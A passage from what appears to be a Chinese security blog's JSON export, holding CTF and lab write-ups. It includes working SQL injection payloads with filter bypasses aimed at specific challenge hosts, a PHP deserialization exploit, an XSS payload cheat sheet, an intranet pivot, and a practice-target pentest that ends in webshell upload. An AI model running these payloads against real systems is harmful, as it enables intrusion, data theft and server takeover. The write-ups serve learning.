askGeorg(args.url): File &quot;reGeorgSocksProxy.py&quot;, line 373, in askGeorg conn = httpScheme(host=httpHost, port=httpPort) File &quot;C:\\Python27\\lib\\site-packages\\urllib3\\connectionpool.py&quot;, line 763, in __init__ **conn_kw) File &quot;C:\\Python27\\lib\\site-packages\\urllib3\\connectionpool.py&quot;, line 166, in __init__ ConnectionPool.__init__(self, host, port) File &quot;C:\\Python27\\lib\\site-packages\\urllib3\\connectionpool.py&quot;, line 69, in __init__ raise LocationValueError(&quot;No host specified.&quot;)urllib3.exceptions.LocationValueError: No host specified. 正确开启后这是样的 配置proxifier： proxifier有两个需要配置的地方，一个是代理服务，一个是代理规则 这个只要按照之前regeorg中设置的配置填就好 但是一定要注意，代理规则的python一定不要打勾！python一定不要打勾！python一定不要打勾！ 否则就会形成多重代理，类似死循环，导致服务端卡死orz。 进入内网之后在内网寻找靶机，突然想起之前看的arp进行局域网攻击，所以用windows自带的arp命令查找了一下局域网的ip，arp -a发现好像192.168.62.128符合我们的要求，直接浏览器访问。成功进入内网的靶机。 这个网站并没有入侵思路。 用扫描器扫了一下，发现有一个123.php比较可疑，访问了一下，发现是一个大马，可能是哪个表哥留下的。如果有那位表哥知道渗透思路的请务必告诉我orz。 参考文章： http://www.tuicool.com/articles/JNRn6nY https://bbs.ichunqiu.com/thread-12514-1-1.html","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/内网渗透/"}]},{"title":"SQL注入练习题解","date":"2017-04-08T16:00:00.000Z","path":"2017/04/09/SQL注入练习总结/","text":"SQL注入练习题解SQL-1题目：http://103.238.227.13:10083/sql首先用单引号，and 1=1，and 1=2 等，发现已经被过滤了。 查看网页源代码，发现是gb2312，看表哥发的资料，采用的是宽字节注入 1http://103.238.227.13:10083/?id=-1%df%27 发现了注入方法，判断有多少列 1234http://103.238.227.13:10083/?id=-1%df&apos; order by 2 --+页面正常http://103.238.227.13:10083/?id=-1%df&apos; order by 3 --+回显Unknown column &apos;3&apos; in &apos;order clause&apos; 所以有2列。查询库名： 1http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(schema_name) From information_schema.schemata --+ 查询表名： 1http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(table_name) From information_schema.tables Where table_schema=database() --+ 查询列名： 1http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(column_name) From information_schema.columns Where table_schema=database() --+ 查询字段名： from key显示出错，推测过滤了key，经表哥提示，在key前加了.，后来发现在key前加上``也可以查出结果。 1http://103.238.227.13:10083/?id=-1%df%27 union select 1,group_concat(id,char(32),string) from .key --+ SQL-2题目地址：http://103.238.227.13:10084/ 这题过滤了and等小写单词，但是换成大小写就可以绕过 运用updatexml()函数报错，@@version函数查询数据库版本 1http://103.238.227.13:10084/?id=-1 aNd uPdatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) SQL-3题目：http://103.238.227.13:10087/ 题目里过滤了union select等等关键字，查了资料，用%00截断。1http://103.238.227.13:10087/?id=1 u%00nion sel%00ect 1,version() --+ 直接查询相应的值 1http://103.238.227.13:10087/?id=1%20u%00nion%20sel%00ect%20GROUP_CONCAT(hash),1%20fr%00om%20.key%20--+ SQL-4题目：http://103.238.227.13:10088/ 题目过滤了各种符号和union，union select查询就不适用了 限制了空格，用注释代替，/**/ 想起了之前的updatexml()函数报错。 1http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT@@version),0x7e),1) 运用load_file()函数读取文件1http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/load_file(0x2f7661722f746573742f6b65795f312e706870)),0x7e),1) 读取成功 调用substring()函数读取文档中字符串内容1http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/substring(load_file(0x2f7661722f746573742f6b65795f312e706870),2,32)),0x7e),1) 是一个php脚本 因为updatexml()、substring()函数每次只能输出32个字符，所以需要分次查询连接字符串得到flag Flag:”7249f5a7fd1de602b30e6f39aea6193a” 查看资料： http://www.jianshu.com/p/ba35a7e1c67d https://zhuanlan.zhihu.com/p/24756501 https://www.waitalone.cn/mysql-error-based-injection.html","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"sqli","slug":"sqli","permalink":"http://yoursite.com/tags/sqli/"}]},{"title":"php反序列化漏洞利用","date":"2017-04-08T16:00:00.000Z","path":"2017/04/09/php反序列化漏洞利用/","text":"0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。 php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。 这也是我们要去利用的地方。 0x01 理解序列化的字符串要学习反序列化漏洞，还要明白序列化后的字符串的意义，方便我们构造payload。 例如：12345678&lt;?php class foo&#123; public $filename='233.txt';&#125;$a = new foo();echo $a-&gt;filename.'&lt;br /&gt;';echo serialize($a); 运行这个php12233.txtO:3:&quot;foo&quot;:1:&#123;s:8:&quot;filename&quot;;s:7:&quot;233.txt&quot;;&#125; 第二行就是我们序列化之后的内容，我们来分析一下 O：对象，对象名长度为3，名字为“foo”，有一个参数。 s：字符串，长度为8，变量名字符串为“filename” 我们执行序列化之后可以将类，数组等压缩到一起。 注：a表示数组，i表示integer 0x02 php反序列化漏洞php反序列化漏洞又称对象注入，可能会导致远程代码执行(RCE) 反序列化漏洞的执行过程就是通过可控的unserialze函数，构造一个类，调用这个类并执行魔术方法，然后执行类中的函数，达到攻击目的。 所以要利用反序列化必须满足两个条件： 1、应用程序中必须有一个实现某种php魔术方法的类，可用于执行恶意攻击。 2、当调用脆弱的unserialize()时，必须声明攻击期间所使用的所有类，否则必须支持此类的对象自动加载。 魔术方法：魔术方法不需要调用就可以执行。常见的魔术方法如下： __construct() 类的构造函数 __destruct() 类的析构函数 __call() 在对象中调用一个不可访问方法时调用 __callStatic() 用静态方式中调用一个不可访问方法时调用 __get() 获得一个类的成员变量时调用 __set() 设置一个类的成员变量时调用 __isset() 当对不可访问属性调用isset()或empty()时调用 __unset() 当对不可访问属性调用unset()时被调用 __sleep() 执行serialize()时，先会调用这个函数 __wakeup() 执行unserialize()时，先会调用这个函数 __toString() 类被当成字符串时的回应方法 __invoke() 调用函数的方式调用一个对象时的回应方法 __set_state() 调用var_export()导出类时，此静态方法会被调用 __clone() 当对象复制完成时调用 __debugInfo() 打印所需调试信息 __autoload() 尝试加载未定义的类 0x03 实战HBctf中有一道综合性的web题，最后的部分刚好是反序列化。 查看源码：123456789101112you are not admin ! &lt;!--$user = $_GET[\"user\"];$file = $_GET[\"file\"];$pass = $_GET[\"pass\"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is admin\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //class.php&#125;else&#123; echo \"you are not admin ! \";&#125; --&gt; 直接在get中构造赋值并没有用。 想到了php的伪协议 php：//input，同时post数据the user is admin第一步绕过，到了include($file); //class.php，提示我读取class.php 可以运用伪协议php://filter读取文件 利用方法：php://filter/convert.base64-encode/resource=xxxxx.php得到base64编码后的class.php,解密得：123456789101112&lt;?phpclass Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return \"__toString was called!\"; &#125;&#125;?&gt; 这里定义了一个Read类，有魔术方法__toString。 然后我用php伪协议读取了一下index.php，真正的源码如下 123456789101112131415161718&lt;?php# index.php$user = isset($_GET['user'])?$_GET[\"user\"]:\"\";$file = isset($_GET['file'])?$_GET[\"file\"]:\"class.php\";$pass = isset($_GET[\"pass\"])?$_GET[\"pass\"]:\"\";if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is admin\"))&#123; echo \"hello admin!&lt;br&gt;\"; if(preg_match(\"/f1a9/\",$file))&#123; exit(); &#125;else&#123; include($file); //class.php $pass = unserialize($pass); echo $pass; &#125;&#125;else&#123; echo \"you are not admin ! \";&#125;?&gt; 有unserialize()，有class类和魔术方法__toString()，我们就可以进行反序列化攻击了。 构造：O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;} 解base64编码，得到flag。 bugku中的一个题与这个类似，有兴趣的可以去尝试一下 http://120.24.86.145:8006/test1/index.php 0x04 如何防御php反序列化漏洞防御php反序列化漏洞很简单。 1、对参数进行过滤转义处理。 2、换用更安全的函数。","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"XSS漏洞利用姿势","date":"2017-04-04T16:00:00.000Z","path":"2017/04/05/XSS漏洞利用姿势/","text":"什么是XSS跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。（来源：百度百科） XSS就是利用网页的漏洞，让网页执行自己的js脚本，来达到一些目的。 所以XSS漏洞需要有输出，只有输出来能将你上传的js代码调动并执行。 XSS常见的有反射型XSS（也叫非持续性XSS）和存储型XSS（也叫持续性XSS） 反射型XSS脚本通过用户提交执行，并没有写入数据库，所以是非持续的，只有提交了相应的url,才会执行javascript脚本。例如：123&lt;?php echo $_ GET['test'];?&gt; 访问:1127.0.0.1/test/xss.php?test=&lt;script&gt;alert(1)&lt;/script&gt; 会发现代码被直接输出并被浏览器解析，弹出了一个弹窗。 储存型XSS通过某种方式将js代码写入数据库中，并在输出界面输出，达到执行js代码的效果。 最常见的例子是留言板，有的留言板不加过滤，就可以将js代码写入到数据库中，就可以通过这个留言板界面盗取用户的cookie，甚至一些更严重的事。 发现漏洞姿势一般会用 &lt;script&gt;alert(1)&lt;/script&gt;来检测是否存在XSS漏洞。 如果存在会直接弹窗并显示1 XSS依赖输出，所以找到输出位置是很重要的，可以输入后查看源代码找找位置 输出的位置基本有以下四种情况： HTML标签之间，如出现在&lt;div&gt;[输出]/&lt;/div&gt;的位置上 当遇到一些优先级较高的html标签或者在标签中，如&lt;textarea&gt;&lt;/textarea&gt;、&lt;title&gt;&lt;/title&gt;、&lt;iframe&gt;&lt;/iframe&gt;等等，就要先闭合相应的标签，再插入js代码。 payload：1&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;script&gt;&lt;textarea&gt; HTML标签之内，如出现在 &lt;input value=&#39;[输出]&#39;/&gt; 的位置上 可以闭合标签，事件触发或者用伪协议的方式执行js代码。 payload：1234/&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;input value=clickmouse=alert(1) x=javascript:alert(1)//data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4= 成为JavaScript代码的值，在&lt;script&gt;var a=&#39;[输出];&#39;&lt;/script&gt;的位置上 闭合标签、直接引用代码中的变量。123;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;a=&quot;;alert(1);//&lt;/script&gt;&lt;script&gt;alert(1)// 成为CSS代码的值，出现在&lt;style&gt;body{color:[输出];}&lt;/style&gt;的位置上 常存在于ie中11;xss:expression(if(!window.x)&#123;alert(1);window.x=1;&#125;) XSS漏洞的绕过 与SQL注入相似，在gbk或gbXXX编码中可以通过宽字节绕过 1%bf\\、%df、%81 *CRLF注入绕过，利用\\r\\n在HTTP响应头注入回车换行符，并注入X-XSS-Protection: 0，可以防止脚本运行被阻止。 IE同域白名单 Referer来源为本域则XSS Filter不生效 Chorme同域白名单 &lt;script&gt;&lt;/script&gt;标签嵌入的是同域内的js文件，XSS Filter就不会防御 大小写混合&lt;scRiPt&gt;&lt;/SCrIpt&gt; 编码(url编码等) 代码混淆(例如：jsfk) XSS利用姿势XSS常用利用方式： 弹出cookie并发送给攻击者 伪造登陆界面钓鱼 获取后台地址 …… 利用XSS的流程： 输入正常内容，观察输出界面。 观察&lt;&gt;\\/“‘等字符过滤情况。 分析输出的解析情况。 构造payload。","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"}]},{"title":"南方数据靶机渗透测试","date":"2017-03-26T16:00:00.000Z","path":"2017/03/27/南方数据靶机渗透测试/","text":"0x01 信息收集网站是南方数据的镜像站，随便点开一个新闻，出现了熟悉的？id=xxxx格式，进行分别用 ‘，and 1=1 ，and 1=2 进行了测试，发现存在sql注入漏洞。从电脑中掏出了sqlmap，就在这时，表哥要求手注，结果试了半天也没有成果，百度了一下“南方数据 漏洞”，发现有0day。 0x02 进入后台 12NewsType.asp?SmallClass=&apos;%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20&apos;&apos;=&apos; 直接利用解出得到的md5值为admin888，通过之前的搜索得知，默认后台为/admin/登陆后台 上传木马发现有一个添加视频和一个添加下载程序两个上传口，并返回给你文件的路径，但只能上传gif|jpg|bmp|png|swf|doc|rar|php这几个格式。查看网页配置，发现有允许上传的文件类型一项在最后加上asp，保存，却还是不能上传asp。最后在系统管理里发现了数据库备份成功传入大马并执行cmd成功但是现在的账户在Administrator组中，但却没有权限，想要进一步搞事还需要提权。 未完待续。","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/tags/渗透测试/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/tags/SQL注入/"}]}]